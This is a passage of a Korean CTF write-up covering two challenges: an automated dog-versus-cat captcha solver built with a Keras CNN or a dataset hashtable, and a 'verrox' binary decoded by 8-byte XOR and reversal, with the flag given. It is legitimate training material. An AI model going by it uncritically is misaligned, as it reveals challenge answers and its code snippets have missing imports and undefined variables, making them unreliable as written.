<p>약 5만장의 강아지와 고양이 사진이 랜덤으로 나오며, 1초 안에 사진에 나온 동물이 강아지인지 고양이인지 맞춰야 하는 captcha solver 문제입니다. 300개의 스테이지를 모두 클리어하면 플래그를 획득할 수 있다.</p>

<p>출제 의도는 일종의 ‘<code class="highlighter-rouge">자동 의사 결정기</code>‘를 만들 수 있는가?’ 이다.</p>

<p>의도했던 풀이는 사실 <code class="highlighter-rouge">CNN과 GAN을 적절히 섞어 하나의 앙상블 모델을 컴파일하고 주어진 데이터셋으로 학습 후 정답을 예측</code>하는 것이였으나,  문제의 난이도를 하향 조절 하다 보니(…) 문제에 제공되는 데이터셋을 전부 제공하게 되었고, 그로 인해 따로 모델을 컴파일하지 않고 주어진 데이터셋으로 일종의 hash table을 만들어 문제를 풀이할 수 있다.</p>

<h3 id="머신러닝으로-풀기">머신러닝으로 풀기</h3>

<p>분류해야 할 데이터가 이미지이기 때문에 <code class="highlighter-rouge">CNN(Convolutional Neural Network) 모델</code>을 사용한다. 주어진 데이터셋의 이미지 사이즈가 모두 제각각이기 때문에 어느정도의 preprocessing 이 필요하다. 또한 훈련의 연산량을 줄여 훈련 효율을 높이기 위해 이미지를 grayscale로 변환했다.</p>

<ol>
  <li>
    <p>이미지 전처리 (Preprocessing)</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="n">np</span>
 <span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="n">pd</span>
 <span class="kn">import</span> <span class="nn">cv2</span>
 <span class="kn">import</span> <span class="nn">tensorflow</span> <span class="k">as</span> <span class="n">tf</span>
 <span class="kn">from</span> <span class="nn">tensorflow.keras.models</span> <span class="kn">import</span> <span class="n">Sequential</span>
 <span class="kn">from</span> <span class="nn">tensorflow.keras.layers</span> <span class="kn">import</span> <span class="n">Dense</span><span class="p">,</span> <span class="n">Flatten</span><span class="p">,</span> <span class="n">Dropout</span><span class="p">,</span> <span class="n">Activation</span><span class="p">,</span> <span class="n">Conv2D</span><span class="p">,</span> <span class="n">MaxPooling2D</span>

 <span class="n">path</span> <span class="o">=</span> <span class="s">'./dataset/train'</span>

 <span class="n">X</span> <span class="o">=</span> <span class="p">[]</span>
 <span class="n">y</span> <span class="o">=</span> <span class="p">[]</span> <span class="c1"># target
</span> <span class="n">convert</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">category</span> <span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">category</span> <span class="o">==</span> <span class="s">'dog'</span><span class="p">)</span>

 <span class="k">def</span> <span class="nf">preprocess</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
     <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
         <span class="n">category</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
         <span class="n">category</span> <span class="o">=</span> <span class="n">convert</span><span class="p">(</span><span class="n">category</span><span class="p">)</span>
         <span class="n">img_array</span> <span class="o">=</span> <span class="n">cv2</span><span class="p">.</span><span class="n">imread</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span><span class="n">p</span><span class="p">),</span><span class="n">cv2</span><span class="p">.</span><span class="n">IMREAD_GRAYSCALE</span><span class="p">)</span>
         <span class="n">new_img_array</span> <span class="o">=</span> <span class="n">cv2</span><span class="p">.</span><span class="n">resize</span><span class="p">(</span><span class="n">img_array</span><span class="p">,</span> <span class="n">dsize</span><span class="o">=</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
         <span class="n">X</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">new_img_array</span><span class="p">)</span>
         <span class="n">y</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">category</span><span class="p">)</span>

 <span class="c1"># preprocess the data
</span> <span class="n">preprocess</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
 <span class="n">X</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="n">array</span><span class="p">(</span><span class="n">X</span><span class="p">).</span><span class="n">reshape</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
 <span class="n">y</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="n">array</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>

 <span class="c1"># normalize data
</span> <span class="n">X</span> <span class="o">=</span> <span class="n">X</span><span class="o">/</span><span class="mf">255.0</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>모델 빌드 및 컴파일</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">model</span> <span class="o">=</span> <span class="n">Sequential</span><span class="p">()</span>

 <span class="c1"># add a densely-connected layer with 64 units to the model:
</span> <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">Conv2D</span><span class="p">(</span><span class="mi">64</span><span class="p">,(</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">),</span> <span class="n">activation</span> <span class="o">=</span> <span class="s">'relu'</span><span class="p">,</span> <span class="n">input_shape</span> <span class="o">=</span> <span class="n">X</span><span class="p">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">1</span><span class="p">:]))</span>
 <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">MaxPooling2D</span><span class="p">(</span><span class="n">pool_size</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">)))</span>

 <span class="c1"># add another layer:
</span> <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">Conv2D</span><span class="p">(</span><span class="mi">64</span><span class="p">,(</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">),</span> <span class="n">activation</span> <span class="o">=</span> <span class="s">'relu'</span><span class="p">))</span>
 <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">MaxPooling2D</span><span class="p">(</span><span class="n">pool_size</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">)))</span>

 <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">Flatten</span><span class="p">())</span>
 <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">Dense</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="n">activation</span><span class="o">=</span><span class="s">'relu'</span><span class="p">))</span>

 <span class="c1"># add a softmax layer with 10 output units:
</span> <span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">Dense</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">activation</span><span class="o">=</span><span class="s">'sigmoid'</span><span class="p">))</span>

 <span class="n">model</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="n">optimizer</span><span class="o">=</span><span class="s">"adam"</span><span class="p">,</span>
               <span class="n">loss</span><span class="o">=</span><span class="s">'binary_crossentropy'</span><span class="p">,</span>
               <span class="n">metrics</span><span class="o">=</span><span class="p">[</span><span class="s">'accuracy'</span><span class="p">])</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>모델 학습</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">model</span><span class="p">.</span><span class="n">fit</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">epochs</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">batch_size</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span> <span class="n">validation_split</span><span class="o">=</span><span class="mf">0.2</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>이미지 예측</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">cv2</span><span class="p">.</span><span class="n">imread</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">cv2</span><span class="p">.</span><span class="n">IMREAD_GRAYSCALE</span><span class="p">)</span>
 <span class="c1"># resize
</span> <span class="n">cv2</span><span class="p">.</span><span class="n">resize</span><span class="p">(</span><span class="n">img_array</span><span class="p">,</span> <span class="n">dsize</span><span class="o">=</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span><span class="mi">80</span><span class="p">))</span>
 <span class="c1"># reshape
</span> <span class="n">data</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="n">array</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="n">reshape</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
 <span class="c1"># normalize
</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">/</span><span class="mf">255.0</span>

 <span class="c1"># predict
</span> <span class="n">model</span><span class="p">.</span><span class="n">predict</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</code></pre></div>    </div>

    <p>이후, 학습한 모델을 이용해 문제 이미지를 실시간으로 받아오고 문제의 정답을 예측한 뒤 정답을 서버로 전송하면 된다.</p>
  </li>
</ol>

<h3 id="hashtable로-풀기">hashtable로 풀기</h3>

<p>소스코드에 나와있는 kaggle competition에 접속하여 주어진 데이터셋을 모두 다운로드 받은 다음 hash table 을 제작한다. 이후 문제 이미지에 해당하는 hash를 이용하여 문제의 정답을 구한다.</p>

<p><br /></p>

<p><br /></p>

<h2 id="verrox">verrox</h2>

<hr />

<p><img src="/assets/bob/bob997.png" alt="/assets/bob/bob997.png" /></p>

<p>description을 살펴보면 세상이 뒤집어진 것 같다는 말을 하고 있다.
verrox를 뒤집으면 xorrev이며, xor + rev라는 것을 유추할 수 있다.
해당 바이너리를 reverse한 후 8바이트 xor 키를 구해 연산하면 원본 ELF 파일이 나오게 되며, 실행 시 플래그를 얻을 수 있다.</p>

<h3 id="1-xor-key">1. xor key</h3>

<p><img src="/assets/bob/bob998.png" alt="/assets/bob/bob998.png" /></p>

<ul>
  <li>바이너리를 hexdump, hxd 등으로 살펴보면 0x231f33f2aa2d7ed2가 상당히 많이 있는 것을 확인할 수 있다.</li>
  <li>8바이트 단위로 0x231f…가 반복되고 있기 때문에 8바이트 단위로 xor 연산을 했다고 볼 수 있다. 또한, elf 바이너리의 경우 null byte의 반복이 많기 때문에 xor key는 0x231f33f2aa2d7ed2로 가정할 수 있다.</li>
</ul>

<h3 id="2-풀이">2. 풀이</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#coding: utf-8
</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="n">data</span> <span class="o">=</span> <span class="s">b''</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"verrox"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"xorrev"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">key</span> <span class="o">=</span> <span class="s">b"</span><span class="se">\x23\x1f\x33\xf2\xaa\x2d\x7e\xd2</span><span class="s">"</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s">b""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"B"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="mi">8</span><span class="p">])</span>

    <span class="n">res</span> <span class="o">=</span> <span class="n">res</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/bob/bob999.png" alt="/assets/bob/bob999.png" /></p>

<ul>
  <li>해당 xor key를 이용하여 8바이트 단위로 xor연산 후 reverse 해주게 되면 원본 바이너리를 획득할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob9100.png" alt="/assets/bob/bob9100.png" /></p>

<ul>
  <li>얻어낸 바이너리를 실행하면 플래그를 얻을 수 있다.</li>
  <li>FLAG : bob{royal_macaron_is_very_tasty_you_know?}</li>
</ul>

   </div>
</div>


  <!-- Start disqus 
<script src="/assets/js/disqusLoader.js" /></script>
<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
<div class="disqus"></div>
<script>
    disqusLoader('.disqus', {
        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
    });
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
End disqus -->


<div class="pagination">
  
  
   <a href="/2020-07-01/chrome-CVE-2019-13720-exploit" class="right arrow">&#8594;</a>
  

  <a href="#" class="top">Top</a>
</div>
    </main>

    <!--footer>
  <span>
    &copy; <time datetime="2020-09-02 00:58:48 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
  </span>
</footer-->

  </body>
</html>
